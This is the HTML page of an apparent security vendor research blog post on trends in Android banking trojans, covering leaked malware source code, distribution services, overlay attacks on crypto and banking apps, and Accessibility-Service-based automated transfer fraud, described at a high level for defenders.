<!doctype html><html lang="en"><head>
    <meta charset="utf-8">
    <title>The Rage of Android Banking Trojans</title>
    <link rel="shortcut icon" href="https://www.threatfabric.com/hubfs/Threatfabric/favicon/threatfabric-icon-dark.svg">
    <meta name="description" content="Trends in capabilities and distribution mechanisms used by Android banking malware.">
    
    
    
    
    
    
    
		
    
    <meta name="viewport" content="width=device-width, initial-scale=1">

    
    <meta property="og:description" content="Trends in capabilities and distribution mechanisms used by Android banking malware.">
    <meta property="og:title" content="The Rage of Android Banking Trojans">
    <meta name="twitter:description" content="Trends in capabilities and distribution mechanisms used by Android banking malware.">
    <meta name="twitter:title" content="The Rage of Android Banking Trojans">

    

    
  <script id="hs-search-input__valid-content-types" type="application/json">
    [
      
        "SITE_PAGE",
      
        "LANDING_PAGE",
      
        "BLOG_POST",
      
        "LISTING_PAGE",
      
        "KNOWLEDGE_ARTICLE",
      
        "HS_CASE_STUDY"
      
    ]
  </script>

    <style>
a.cta_button{-moz-box-sizing:content-box !important;-webkit-box-sizing:content-box !important;box-sizing:content-box !important;vertical-align:middle}.hs-breadcrumb-menu{list-style-type:none;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px}.hs-breadcrumb-menu-item{float:left;padding:10px 0px 10px 10px}.hs-breadcrumb-menu-divider:before{content:'›';padding-left:10px}.hs-featured-image-link{border:0}.hs-featured-image{float:right;margin:0 0 20px 20px;max-width:50%}@media (max-width: 568px){.hs-featured-image{float:none;margin:0;width:100%;max-width:100%}}.hs-screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px}
</style>


	<script type="application/ld+json" class="test">
	{
		"@context": "https://schema.org",
		"@type": "BlogPosting",
		"headline": "The Rage of Android Banking Trojans",
		"image": [
			"https://6701575.fs1.hubspotusercontent-na1.net/hubfs/6701575/Threatfabric/images/blog/the-rage/cover.webp"
		 ],
		"mainEntityOfPage": {
			"@type": "WebPage",
			"@id": "https://www.threatfabric.com/blogs/the-rage-of-android-banking-trojans"
		},
		"datePublished": "2024-10-01",
		"dateModified": "2024-10-01"
	}
	</script>
	

    <link rel="preload" href="/_hcms/googlefonts/Kanit/100.woff2" as="font" type="font/woff2" crossorigin="anonymous">
    <link rel="preload" href="/_hcms/googlefonts/Kanit/regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
    <link rel="preload" href="/_hcms/googlefonts/Kanit/200.woff2" as="font" type="font/woff2" crossorigin="anonymous">
    
<link rel="stylesheet" href="https://www.threatfabric.com/hs-fs/hubfs/hub_generated/template_assets/1/100565938482/1741944225754/template_main.min.css">
<link rel="stylesheet" href="https://www.threatfabric.com/hs-fs/hubfs/hub_generated/template_assets/1/101040140217/1741944259669/template_child.min.css">
<link class="hs-async-css" rel="preload" href="https://www.threatfabric.com/hs-fs/hubfs/hub_generated/template_assets/1/101294760764/1741944260158/template_icons.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.threatfabric.com/hs-fs/hubfs/hub_generated/template_assets/1/101294760764/1741944260158/template_icons.css"></noscript>
<link class="hs-async-css" rel="preload" href="https://www.threatfabric.com/hs-fs/hubfs/hub_generated/template_assets/1/101294760784/1741944260346/template_nucleo.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.threatfabric.com/hs-fs/hubfs/hub_generated/template_assets/1/101294760784/1741944260346/template_nucleo.min.css"></noscript>
<link class="hs-async-css" rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css"></noscript>
<link rel="stylesheet" href="https://www.threatfabric.com/hs-fs/hubfs/hub_generated/module_assets/1/101038360946/1742024656457/module_Header.min.css">
<link rel="stylesheet" href="https://7052064.fs1.hubspotusercontent-na1.net/hubfs/7052064/hub_generated/module_assets/1/-2712622/1742393214965/module_search_input.min.css">
<link rel="stylesheet" href="https://www.threatfabric.com/hs-fs/hubfs/hub_generated/module_assets/1/102233451816/1742024661492/module_Blog_Post_01_-_Banner.min.css">

  <style>
    
      .blog-post-01_banner {
        background-image: url('https://www.threatfabric.com/hubfs/Threatfabric/images/tf-blogpost-banner-divider-01.svg');
      }
    
  </style>

<link rel="stylesheet" href="https://www.threatfabric.com/hs-fs/hubfs/hub_generated/module_assets/1/102407694414/1742024662514/module_Blog_Post_01_-_CTA.min.css">

<style>
  
    .module_16766034125746 {
      background-image: url('https://www.threatfabric.com/hubfs/Threatfabric/images/tf-offer-bg-divider-01.svg');
    }
  
</style>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/themes/prism.min.css">
<link rel="stylesheet" href="https://www.threatfabric.com/hs-fs/hubfs/hub_generated/module_assets/1/101039839309/1742024657488/module_Footer.min.css">
<style>
  @font-face {
    font-family: "Roboto";
    font-weight: 400;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Roboto/regular.woff2") format("woff2"), url("/_hcms/googlefonts/Roboto/regular.woff") format("woff");
  }
  @font-face {
    font-family: "Roboto";
    font-weight: 700;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Roboto/700.woff2") format("woff2"), url("/_hcms/googlefonts/Roboto/700.woff") format("woff");
  }
  @font-face {
    font-family: "Kanit";
    font-weight: 100;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Kanit/100.woff2") format("woff2"), url("/_hcms/googlefonts/Kanit/100.woff") format("woff");
  }
  @font-face {
    font-family: "Kanit";
    font-weight: 200;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Kanit/200.woff2") format("woff2"), url("/_hcms/googlefonts/Kanit/200.woff") format("woff");
  }
  @font-face {
    font-family: "Kanit";
    font-weight: 400;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Kanit/regular.woff2") format("woff2"), url("/_hcms/googlefonts/Kanit/regular.woff") format("woff");
  }
</style>

<!-- Editor Styles -->
<style id="hs_editor_style" type="text/css">
.footer-global-row-0-force-full-width-section > .row-fluid {
  max-width: none !important;
}
/* HubSpot Non-stacked Media Query Styles */
@media (min-width:768px) {
  .footer-global-row-0-vertical-alignment > .row-fluid {
    display: -ms-flexbox !important;
    -ms-flex-direction: row;
    display: flex !important;
    flex-direction: row;
  }
  .footer-global-module-1-vertical-alignment {
    display: -ms-flexbox !important;
    -ms-flex-direction: column !important;
    -ms-flex-pack: center !important;
    display: flex !important;
    flex-direction: column !important;
    justify-content: center !important;
  }
  .footer-global-module-1-vertical-alignment > div {
    flex-shrink: 0 !important;
  }
}
/* HubSpot Styles (default) */
.footer-global-row-0-padding {
  padding-top: 0px !important;
  padding-bottom: 0px !important;
  padding-left: 0px !important;
  padding-right: 0px !important;
}
</style>
    <script type="application/ld+json">
{
  "mainEntityOfPage" : {
    "@type" : "WebPage",
    "@id" : "https://www.threatfabric.com/blogs/the-rage-of-android-banking-trojans"
  },
  "author" : {
    "name" : "John Doe",
    "url" : "https://www.threatfabric.com/blogs/author/john-doe",
    "@type" : "Person"
  },
  "headline" : "The Rage of Android Banking Trojans",
  "datePublished" : "2021-04-28T00:56:00.000Z",
  "dateModified" : "2023-06-27T06:23:29.202Z",
  "publisher" : {
    "name" : "ThreatFabric B.V.",
    "logo" : {
      "url" : "https://6701575.fs1.hubspotusercontent-na1.net/hubfs/6701575/TF_LogoNew_Dark-1.png",
      "@type" : "ImageObject"
    },
    "@type" : "Organization"
  },
  "@context" : "https://schema.org",
  "@type" : "BlogPosting",
  "image" : [ "https://6701575.fs1.hubspotusercontent-na1.net/hubfs/6701575/Threatfabric/images/blog/the-rage/cover.webp" ]
}
</script>


    
<!--  Added by GoogleAnalytics4 integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}

var useGoogleConsentModeV2 = true;
var waitForUpdateMillis = 1000;


if (!window._hsGoogleConsentRunOnce) {
  window._hsGoogleConsentRunOnce = true;

  gtag('consent', 'default', {
    'ad_storage': 'denied',
    'analytics_storage': 'denied',
    'ad_user_data': 'denied',
    'ad_personalization': 'denied',
    'wait_for_update': waitForUpdateMillis
  });

  if (useGoogleConsentModeV2) {
    _hsp.push(['useGoogleConsentModeV2'])
  } else {
    _hsp.push(['addPrivacyConsentListener', function(consent){
      var hasAnalyticsConsent = consent && (consent.allowed || (consent.categories && consent.categories.analytics));
      var hasAdsConsent = consent && (consent.allowed || (consent.categories && consent.categories.advertisement));

      gtag('consent', 'update', {
        'ad_storage': hasAdsConsent ? 'granted' : 'denied',
        'analytics_storage': hasAnalyticsConsent ? 'granted' : 'denied',
        'ad_user_data': hasAdsConsent ? 'granted' : 'denied',
        'ad_personalization': hasAdsConsent ? 'granted' : 'denied'
      });
    }]);
  }
}

gtag('js', new Date());
gtag('set', 'developer_id.dZTQ1Zm', true);
gtag('config', 'G-SZHLN4DST6');
</script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-SZHLN4DST6"></script>

<!-- /Added by GoogleAnalytics4 integration -->



<meta property="og:image" content="https://www.threatfabric.com/hubfs/Threatfabric/images/blog/the-rage/cover.webp">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">

<meta name="twitter:image" content="https://www.threatfabric.com/hubfs/Threatfabric/images/blog/the-rage/cover.webp">


<meta property="og:url" content="https://www.threatfabric.com/blogs/the-rage-of-android-banking-trojans">
<meta name="twitter:card" content="summary_large_image">

<link rel="canonical" href="https://www.threatfabric.com/blogs/the-rage-of-android-banking-trojans">

<meta property="og:type" content="article">
<link rel="alternate" type="application/rss+xml" href="https://www.threatfabric.com/blogs/rss.xml">
<meta name="twitter:domain" content="www.threatfabric.com">
<script src="//platform.linkedin.com/in.js" type="text/javascript">
    lang: en_US
</script>

<meta http-equiv="content-language" content="en">






    
  <meta name="generator" content="HubSpot"></head>
	
	
	
	
	
	
	
	
	

	
	
	  
	
	
		
  <body class="template-header-transparent">
    <div class="body-wrapper   hs-content-id-104395289364 hs-blog-post hs-blog-id-101307487134">
		  
			
			<div data-global-resource-path="Threatfabric_Hatch/templates/partials/header.html">
  <a href="#main-content" class="header_skip">Skip to content</a>

 


  

		

  













<header>
	
	
		
	
	
	
	
	<div class="header header-static border-b bg-white text-default">
		<div class="container h-full">
			<div class="flex items-stretch justify-between h-full">
				<div class="flex items-center py-2">
					<div class="header-logo">
						<a href="//www.threatfabric.com/" id="hs-link-hatch_header_" style="border-width:0px;border:0px;"><img src="https://www.threatfabric.com/hubfs/Threatfabric/logos/threatfabric-logo-light.svg" class="hs-image-widget " height="129" style="height: auto;width:100px;border-width:0px;border:0px;" width="100" alt="threatfabric-logo-light" title="threatfabric-logo-light"></a>
					</div>
					<div class="header-inverted-logo">
						<a href="//www.threatfabric.com/" id="hs-link-hatch_header_" style="border-width:0px;border:0px;"><img src="https://www.threatfabric.com/hubfs/Threatfabric/logos/threatfabric-logo-light.svg" class="hs-image-widget " height="129" style="height: auto;width:100px;border-width:0px;border:0px;" width="100" alt="threatfabric-logo-light" title="threatfabric-logo-light"></a>
					</div>
				</div>
				<div class="header-menu inline-flex items-center mb:ml-4 flex-row-reverse ds:flex-row">
					
					
						<div class="hs-menu-wrapper tb:mr-8">

							
							<ul>
								
								
								  
									<li class="hs-menu-item hs-menu-depth-1  hs-item-has-children "><a href="">OUR SOLUTIONS</a>
										
										
											<ul class="hs-menu-children-wrapper">
												
													<li class="hs-menu-item hs-menu-depth-2  "><a href="https://www.threatfabric.com/mti">Mobile Threat Intelligence (MTI)</a>
														
												  </li>
												
													<li class="hs-menu-item hs-menu-depth-2  "><a href="https://www.threatfabric.com/frs">Fraud Risk Suite (FRS)</a>
														
												  </li>
												
											</ul>
										
										
	
	
	

									</li>
								
								  
									<li class="hs-menu-item hs-menu-depth-1   "><a href="https://www.threatfabric.com/partners">PARTNERS</a>
										
										
										
	
	
	

									</li>
								
								  
									<li class="hs-menu-item hs-menu-depth-1   "><a href="https://www.threatfabric.com/resources">RESOURCES</a>
										
										
										
	
	
	

									</li>
								
								  
									<li class="hs-menu-item hs-menu-depth-1   "><a href="https://www.threatfabric.com/news">IN THE NEWS</a>
										
										
										
	
	
	

									</li>
								
								  
									<li class="hs-menu-item hs-menu-depth-1   "><a href="https://www.threatfabric.com/blogs">ARTICLES</a>
										
										
										
	
	
	

									</li>
								
								
								<li class="tb:hidden">
                  
									<a href="https://www.threatfabric.com/contact" class="uppercase">Contact</a>
								</li>
                
                
                
								
									<li class="tb:hidden">
                    <a href="https://www.linkedin.com/company/threatfabric" target="_blank" rel="noopener">Linkedin</a>
									</li>
								
									<li class="tb:hidden">
                    <a href="https://twitter.com/threatfabric" target="_blank" rel="noopener">Twitter</a>
									</li>
								
									<li class="tb:hidden">
                    <a href="https://www.threatfabric.com/jobs">Jobs</a>
									</li>
								
									<li class="tb:hidden">
                    <a href="https://www.threatfabric.com/privacy">Privacy</a>
									</li>
								
									<li class="tb:hidden">
                    <a href="https://www.threatfabric.com/contact">Intel/PGP</a>
									</li>
								
                
								
							</ul>
							
						</div>
					
					
					<div class="header-menu-right flex items-center py-4">
						
							<div class="header_language-switcher-wrapper"></div>
						
						
            
						  <a href="https://www.threatfabric.com/contact" class="btn btn-m btn-solid btn-primary text-white fill-white ml-4 tb:ml-12 hidden ds:block">Contact</a>
						
					</div>
					
				</div>
			</div>
		</div>
	</div>
	

</header>

		
			<div class="header-hidden hidden">
				
			</div>

			<div class="header-search-trigger flex items-center hidden">
				<svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512" aria-hidden="true"><g id="search1_layer"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z" /></g></svg>
			</div>

			<div class="header-search">
				<div class="relative">
					<div class="header-search_top block absolute">
						<div class="header-search-close">
							<div class="hamburger hamburger--slider js-hamburger is-active flex items-center justify-center h-full">
								<div class="hamburger-box">
									<div class="hamburger-inner"></div>
								</div>
							</div>
						</div>
					</div>
					<div id="hs_cos_wrapper_site_search" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">




  








<div class="hs-search-field">

    <div class="hs-search-field__bar">
      <form data-hs-do-not-collect="true" action="/hs-search-results">
        
        <input type="text" class="hs-search-field__input" name="term" autocomplete="off" aria-label="Search" placeholder="Search">

        
          
            <input type="hidden" name="type" value="SITE_PAGE">
          
        
          
        
          
            <input type="hidden" name="type" value="BLOG_POST">
          
        
          
        
          
        
          
        

        
      </form>
    </div>
    <ul class="hs-search-field__suggestions"></ul>
</div></div>
				</div>
			</div>

		
	

</div>
			
			
			<div id="main-content">
				
<div class="blog-template-01 blog-post-02">
  
	
  
  <div id="hs_cos_wrapper_module_167627086699614" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="dnd-section relative blog-post-01_banner bg-cover bg-bottom bg-no-repeat">
  
  <div class="row-fluid">
    <div class="relative ds:mt-16 mt-4  text-white heading-primary text-left inherit">
      <div class="tb:flex tb:flex-wrap -m-4">
        <div class="tb:w-1/2">
          <div class="pl-4 pb-8 tb:pr-10">
            <div class="mb-4">
              
                
                  <span class="bg-primary text-white uppercase text-xl px-6 py-1">Research</span>
                 
              
            </div>
            <h2 class="leading-none mb-2 mt-10">The Rage of Android Banking Trojans</h2>
            <p class="text-2xl">28 April 2021</p>
          </div>
        </div>
        
        <div class="tb:w-1/2 p-4">
          <div class="blog-post-01_banner-img">
            <img src="https://www.threatfabric.com/hubfs/Threatfabric/images/blog/the-rage/cover.webp" loading="lazy" class="block" width="100%" alt="">
          </div>
        </div>
        
      </div>
    </div>
  </div>
</div>



</div>
		
  <div class="dnd-section blog-post-01_content pt-0 -mt-4 pb-4 mb:pb-28 px-0 ds:px-auto">
		<div class="row-fluid">
			<div class="ds:flex ds:justify-center ds:-m-4">
				
				<div class="tb:w-1/4 p-4 mt-4 ds:p-16 flex flex-col ds:block hidden">
					<div class="h-full">
						
							<div class="sticky-column-trigger toc-sticky text-sm ">
								<h3 class="font-light text-base">Jump to</h3>
								<div class="toc"></div>
						  </div>
						
					</div>
					
				</div>
				
				<div class="ds:w-3/4 ds:p-4">
					<div class="toc-content content-wrapper bg-white relative ds:p-20 tb:p-12 mb:p-4">
						<span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><h2 id="introduction">Introduction</h2> 
<p>In Greek mythology Achilles was quite simply invincible during the Trojan War; he was also rather proud and bad-tempered for his own good and his rage would cost both his countrymen and the enemy dearly. In the past 7 years, ThreatFabric has discovered many new Android banking trojans, all with one common trait: an insatiable rage against Android banking apps. In this blog we will discuss what have been the underlying catalysts behind this rage and what new weapons are currently filling the virtual Trojan Horses. The second part of the blog is focused on new on-device fraud capabilities utilised by malware families to perform fraud in an automated way using the victims own Android banking app.</p> 
<!--more--> 
<h2 id="catalysts">Catalysts</h2> 
<p><img loading="lazy" src="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/catalysts.webp?width=1600&amp;height=900&amp;name=catalysts.webp" alt="catalysts" width="1600" height="900" style="height: auto; max-width: 100%; width: 1600px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/catalysts.webp?width=800&amp;height=450&amp;name=catalysts.webp 800w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/catalysts.webp?width=1600&amp;height=900&amp;name=catalysts.webp 1600w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/catalysts.webp?width=2400&amp;height=1350&amp;name=catalysts.webp 2400w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/catalysts.webp?width=3200&amp;height=1800&amp;name=catalysts.webp 3200w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/catalysts.webp?width=4000&amp;height=2250&amp;name=catalysts.webp 4000w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/catalysts.webp?width=4800&amp;height=2700&amp;name=catalysts.webp 4800w" sizes="(max-width: 1600px) 100vw, 1600px"></p> 
<p>&nbsp;</p> 
<p>One of the most obvious catalysts that played an important role in The Rage we are experiencing are the source code leaks of two very effective bots, namely Anubis 2.5 and Cerberus: these leaks resulted in multiple private trojan versions actively targeting regions such as Poland, Spain, Turkey, and Italy (local actors).</p> 
<p>We also noticed a very clear new trend adopted by Android banking families in the way they advertise themselves. From 2018 to mid 2020 Android banking trojans from families like Red Alert or Cerberus, had all adopted the Malware as a Service (MaaS) model: actors would rent their malware services on a subscription basis and would aggressively advertise their service on multiple dark web forums. What’s noticeable is that the MaaS strategy for most adversaries has resulted in financial gain on short term but has not been very sustainable over time (Maza-in’s Anubis and Red Alert as MaaS are good examples). However, recent malware families, including Alien or Medusa among others, adopted a more reserved approach, limiting their exposure on public forums and using side-channels for the customers to communicate directly with the vendor.</p> 
<p>Looking at the current successful infections rates of the Trojans families we are tracking, we can only conclude that the new private strategy is paying out and seems to be a more sustainable business model.</p> 
<p>The last catalyst that endorses The Rage is the professionalization in malware distribution campaigns. Within the Android banking trojans ecosystem, we observed an increase in the number of advisories providing so-called dedicated trojan distribution services (DaaS). These services usually consist of dropper/loader Android apps (masquerading as legitimate apps) in different app stores, including the Google Play Store. The Rage does not stop at abusing trusted apps stores. Recently we have seen a considerable number of distribution campaigns utilizing GitHub, Discord and other social media channels as main storage and spreading tactic.</p> 
<p>&nbsp;</p> 
<p><img loading="lazy" src="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/github.webp?width=1600&amp;height=900&amp;name=github.webp" alt="github" width="1600" height="900" style="height: auto; max-width: 100%; width: 1600px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/github.webp?width=800&amp;height=450&amp;name=github.webp 800w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/github.webp?width=1600&amp;height=900&amp;name=github.webp 1600w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/github.webp?width=2400&amp;height=1350&amp;name=github.webp 2400w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/github.webp?width=3200&amp;height=1800&amp;name=github.webp 3200w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/github.webp?width=4000&amp;height=2250&amp;name=github.webp 4000w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/github.webp?width=4800&amp;height=2700&amp;name=github.webp 4800w" sizes="(max-width: 1600px) 100vw, 1600px"></p> 
<p>&nbsp;</p> 
<h2 id="statistics">Statistics</h2> 
<p>Our Mobile Threat Intel (MTI) platform, responsible for classifying Android banking malware samples, cataloguing their technical malware capabilities and extracting the so-called overlay targets, has observed a 129% increase in the list of apps targeted with overlays attacks since 2019. The largest increase has taken place the past year and The Rage is continuing in 2021.</p> 
<p>&nbsp;</p> 
<p><img loading="lazy" src="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/overlay.webp?width=1600&amp;height=900&amp;name=overlay.webp" alt="overlay" width="1600" height="900" style="height: auto; max-width: 100%; width: 1600px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/overlay.webp?width=800&amp;height=450&amp;name=overlay.webp 800w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/overlay.webp?width=1600&amp;height=900&amp;name=overlay.webp 1600w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/overlay.webp?width=2400&amp;height=1350&amp;name=overlay.webp 2400w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/overlay.webp?width=3200&amp;height=1800&amp;name=overlay.webp 3200w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/overlay.webp?width=4000&amp;height=2250&amp;name=overlay.webp 4000w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/overlay.webp?width=4800&amp;height=2700&amp;name=overlay.webp 4800w" sizes="(max-width: 1600px) 100vw, 1600px"></p> 
<p>&nbsp;</p> 
<div id="hs_cos_wrapper_widget_1677550498661" data-hs-cos-general-type="widget" data-hs-cos-type="module"> 
 <div> 
  <div> 
   <div> 
    <p><span>The most targeted apps are related to crypto currency, but the top 20 also includes many apps from banks.</span></p> 
   </div> 
  </div> 
 </div> 
</div> 
<div id="hs_cos_wrapper_widget_1677550523948" data-hs-cos-general-type="widget" data-hs-cos-type="module"> 
 <div> 
  <div> 
   <div> 
    <div>
     &nbsp;
    </div> 
    <div>
     <img loading="lazy" src="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/top_targets.webp?width=1600&amp;height=900&amp;name=top_targets.webp" alt="top_targets" width="1600" height="900" style="height: auto; max-width: 100%; width: 1600px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/top_targets.webp?width=800&amp;height=450&amp;name=top_targets.webp 800w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/top_targets.webp?width=1600&amp;height=900&amp;name=top_targets.webp 1600w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/top_targets.webp?width=2400&amp;height=1350&amp;name=top_targets.webp 2400w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/top_targets.webp?width=3200&amp;height=1800&amp;name=top_targets.webp 3200w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/top_targets.webp?width=4000&amp;height=2250&amp;name=top_targets.webp 4000w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/top_targets.webp?width=4800&amp;height=2700&amp;name=top_targets.webp 4800w" sizes="(max-width: 1600px) 100vw, 1600px">
    </div> 
   </div> 
  </div> 
 </div> 
</div> 
<p>With many different crypto-currencies hitting their highest market value in 2021, populating newsfeeds all over the world and now more than ever being discussed extensively in mainstream media, it is not a surprise that crypto-currency wallets are the most common targets for this new wave of banking trojans. Another important fact to consider is that, while banking apps tend to have different versions of their APK based on the country they serve, crypto-wallets tend to have one unique APK, making it easier for malicious actors to target them.</p> 
<h2 id="new_capabilities_&amp;_trends">New capabilities &amp; trends</h2> 
<p>A clear new trend in Android banking trojans families is the focus on developing malware capabilities that allow actors to perform fraud on a victims in an automated way using the victims own banking or Bitcoin wallet apps, overview:</p> 
<ul> 
 <li>Scaling on-device fraud attempts by developing Automated Transfer System modules powered by AccessibilityService.</li> 
 <li>New ways to start a Remote Access sessions (RAT) relaying on Android native code to avoid additional installations (VNC/Teamvier)</li> 
 <li>Logging all (secret) content inside apps, including OTP apps like Authenticator (Google/Microsoft).</li> 
 <li>Manipulating the beneficiary input fields of Android banking apps while the victim is in the flow of performing payments (very successful attack).</li> 
</ul> 
<p>Entering a new ERA shifting focus from credential stealing capabilities to on-device fraud automation.</p> 
<p>&nbsp;</p> 
<p><img loading="lazy" src="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/MO.webp?width=1600&amp;height=900&amp;name=MO.webp" alt="MO" width="1600" height="900" style="height: auto; max-width: 100%; width: 1600px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/MO.webp?width=800&amp;height=450&amp;name=MO.webp 800w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/MO.webp?width=1600&amp;height=900&amp;name=MO.webp 1600w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/MO.webp?width=2400&amp;height=1350&amp;name=MO.webp 2400w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/MO.webp?width=3200&amp;height=1800&amp;name=MO.webp 3200w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/MO.webp?width=4000&amp;height=2250&amp;name=MO.webp 4000w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/MO.webp?width=4800&amp;height=2700&amp;name=MO.webp 4800w" sizes="(max-width: 1600px) 100vw, 1600px"></p> 
<p>&nbsp;</p> 
<p>For the past 5 years the main way to steal mobile banking login credentials and verification codes (OTP) has been the use of so-called overlay attacks. With this attack pattern (MITRE TTP: T1411) attackers harvest login credentials with a fake login window on top of the original banking app. In the past year malicious actors mainly used these stolen credentials to register a new device to perform fraud or steal the currency in a crypto wallet using a different channel, for example through the web interface. This attack is also known as device registrations fraud, which results in financial loss on a separate device or channel.</p> 
<p>However, as covered in our 2020 blog<span>&nbsp;</span><a href="https://www.threatfabric.com/blogs/2020_year_of_the_rat.html">“Year of the RAT”</a>, actors moved to execute financial fraud scenarios directly on the victim’s device by installing additional services such as a back-connect proxy and remote access software, such as VNC or TeamViewer, to control the victim’s device remotely.</p> 
<p>This year actors have taken the so called on-device fraud strategy to the next level by performing actions in the targeted banking app on behalf of the victim and even automating fraudulent transfers.</p> 
<h3 id="automated_transfer_system_(ats)">Automated Transfer System (ATS)</h3> 
<p>&nbsp;</p> 
<p><img loading="lazy" src="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/ats.webp?width=1600&amp;height=900&amp;name=ats.webp" alt="ats" width="1600" height="900" style="height: auto; max-width: 100%; width: 1600px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/ats.webp?width=800&amp;height=450&amp;name=ats.webp 800w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/ats.webp?width=1600&amp;height=900&amp;name=ats.webp 1600w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/ats.webp?width=2400&amp;height=1350&amp;name=ats.webp 2400w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/ats.webp?width=3200&amp;height=1800&amp;name=ats.webp 3200w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/ats.webp?width=4000&amp;height=2250&amp;name=ats.webp 4000w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/ats.webp?width=4800&amp;height=2700&amp;name=ats.webp 4800w" sizes="(max-width: 1600px) 100vw, 1600px"></p> 
<p>&nbsp;</p> 
<p>Android’s Accessibility Service’s main purpose is to assist users with disabilities. However, when a victim is lured by Android banking trojans into enabling this service with enticing and repeating fake messages, the (malicious) AccessibilityService can read anything a normal user can see and recreate any action an user can do on an Android device.</p> 
